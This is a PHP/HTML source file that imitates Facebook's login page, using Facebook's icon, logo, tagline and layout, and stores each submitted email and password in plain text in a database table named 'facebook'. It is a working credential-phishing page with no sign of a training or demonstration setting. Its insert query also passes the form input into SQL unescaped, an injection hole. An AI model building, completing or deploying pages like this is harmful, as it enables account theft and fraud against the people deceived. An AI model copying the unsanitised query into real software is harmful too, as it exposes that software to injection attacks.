<?php


require "serve/conection.php";
if (isset($_POST['submit'])) {

  $email = $_POST['email'];
  $password = $_POST['password'];

  $sql = mysqli_query($conn, $insectar = "INSERT INTO `facebook` (`email`,`password`) VALUES ('$email','$password')");


}



?>



<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" type="image/x-icon">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"
    crossorigin="anonymous"></script>
  <link rel="stylesheet" href="css/bootstrap/bootstrap.css">
  <link rel="stylesheet" href="css/stylos.css" />



  <title>Facebook</title>

  <!-- background del formulario background-color: #fff; -->
  <!-- color del color de log in #1877f2 -->
</head>

<body>

  <div class="container">
    <div class="row fila mt-5 ">
      <div
        class="col-lg-6  col-sm-12  primera  container d-flex align-items-center justify-content-center centered-div   ">
        <div class="container">

          <div class="">

            <img class="imagen  " src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" height="106" alt="" />
            <h2 class="letra ">
              Connect with friends and the world around you on Facebook.
            </h2>
          </div>

        </div>
      </div>
      <div class="col-lg-6  segunda  container d-flex align-items-center justify-content-center centered-div  ">
        <div class="caja ">
          <form action="/" method="post">
            <div class="my-3">
              <input class="form-control   form-control-lg  " required type="email" name="email"
                placeholder="Email or phone number" type="text">
            </div>

            <div>
              <input class="form-control  form-control-lg" name="password" required placeholder="Password"
                type="password">

            </div>

            <div>
              <button class="btn w-100 btn-lg text-center btn-primary  botonLogin" name="submit" type="submit"> Log
                In</button>
            </div>
            <div class="forgot">
              <a class="textForgot  " href="">Forgot password?</a>
            </div>


          </form>
          <hr>

          <div class="text-center">
            <button class="btn  btn-success create">
              Create new account

            </button>
          </div>






        </div>



      </div>


    </div>
    <div class="row cajaCreate ">
      <div class="col-lg-6">

      </div>
      <div class="col-lg-6 tercera ">
        <div class="ayuda">
          <a class="createPage" href="https://www.facebook.com/pages/create/?ref_type=registration_form"
            class="_8esh">Create a Page</a>
          for a celebrity, brand or business.
        </div>


      </div>
    </div>

  </div>
  </div>


  <script src="js/bootstra.js"></script>
</body>

</html>